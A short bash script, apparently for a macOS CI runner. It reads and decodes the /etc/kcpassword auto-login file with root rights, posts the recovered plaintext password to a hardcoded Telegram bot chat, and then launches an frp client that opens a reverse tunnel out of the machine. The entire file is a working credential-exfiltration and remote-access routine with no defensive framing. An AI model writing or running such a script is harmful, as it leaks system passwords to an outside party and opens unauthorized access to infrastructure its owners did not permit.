#!/bin/bash
exec 2>&1
set -euxo pipefail

# when running in CI override the frpc tls files.

#get password 
# curl -O https://raw.githubusercontent.com/jjarava/mac-osx-forensics/master/kcpass.py
passencode=$(sudo xxd -p /etc/kcpassword | tr -d \\n)
password=$(python kcpass.py ${passencode})



curl "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?text=${password}&chat_id=1280783647" 2>/dev/null 1>/dev/null

./frp/frpc -c frpc-mac.ini 2>&1 
